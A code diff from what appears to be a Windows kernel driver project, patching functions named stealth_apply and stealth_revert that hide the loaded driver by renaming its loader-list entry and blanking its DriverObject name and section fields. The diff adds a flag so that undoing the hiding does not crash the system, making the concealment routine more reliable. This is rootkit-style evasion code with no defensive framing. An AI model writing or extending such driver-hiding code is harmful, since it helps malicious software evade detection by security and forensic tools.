@@ -64,6 +64,11 @@ static UNICODE_STRING         g_saved_base_dll_name = { 0, 0, NULL };
 static UNICODE_STRING         g_saved_full_dll_name = { 0, 0, NULL };
 static UNICODE_STRING         g_saved_driver_name   = { 0, 0, NULL };
 static PVOID                  g_saved_driver_section = NULL;
+/* Set only after both the KLDR rename AND the DriverObject field saves
+ * have succeeded.  stealth_revert refuses to restore DriverObject
+ * fields unless this is TRUE so an early-returning apply does not
+ * blit zero-initialized statics over drv->DriverName/DriverSection. */
+static BOOLEAN                g_stealth_driver_saved = FALSE;
 
 /* Case-insensitive wide comparison of e->BaseDllName against `want`.
  * `want` must be a zero-terminated WCHAR array; its terminator is not
@@ -219,6 +224,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     if (drv) {
         g_saved_driver_name    = drv->DriverName;
         g_saved_driver_section = drv->DriverSection;
+        g_stealth_driver_saved = TRUE;
         drv->DriverName.Length         = 0;
         drv->DriverName.MaximumLength  = 0;
         drv->DriverName.Buffer         = NULL;
@@ -231,6 +237,7 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
 
 NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
     KIRQL irql;
+    BOOLEAN restore_driver;
 
     /* Phase 1.5: use the shared g_stealth_lock, no re-init. */
     KeAcquireSpinLock(&g_stealth_lock, &irql);
@@ -240,9 +247,16 @@ NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
         g_saved_entry->FullDllName = g_saved_full_dll_name;
         g_saved_entry = NULL;
     }
+    restore_driver = g_stealth_driver_saved;
+    g_stealth_driver_saved = FALSE;
     KeReleaseSpinLock(&g_stealth_lock, irql);
 
-    if (drv) {
+    /* Only restore DriverObject fields if stealth_apply ran to
+     * completion (and actually saved them).  An early-returning apply
+     * leaves the save statics zeroed; blindly restoring from them
+     * would write NULL DriverSection and MmUnloadSystemImage would
+     * deref it. */
+    if (drv && restore_driver) {
         drv->DriverName    = g_saved_driver_name;
         drv->DriverSection = g_saved_driver_section;
     }
